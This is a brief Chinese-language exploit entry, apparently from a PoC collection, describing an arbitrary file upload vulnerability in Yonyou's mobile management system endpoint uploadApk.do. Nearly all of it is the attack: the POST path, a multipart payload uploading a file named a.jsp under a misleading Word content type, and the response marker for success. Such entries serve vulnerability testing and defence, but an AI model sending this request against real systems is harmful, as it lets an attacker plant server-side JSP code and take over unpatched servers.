# 用友移动管理系统uploadApk.do任意文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **请求**：`POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
Content-Disposition:form-data;name="downloadpath"; filename="a.jsp"
Content-Type: application/msword
hello
------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
```
- **响应特征**：-1